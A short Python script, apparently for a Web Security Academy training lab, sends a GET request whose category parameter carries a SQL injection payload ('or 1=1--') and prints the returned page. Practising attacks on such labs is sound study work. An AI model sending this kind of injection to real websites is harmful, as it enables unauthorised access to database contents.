import requests

response = requests.get(
    'https://0a4b003103334dd7804dd0ab00ea0017.web-security-academy.net//filter?category=Lifestyle%27%20or%201=1--',
)

print(response.text)  # Shows the page's HTML source
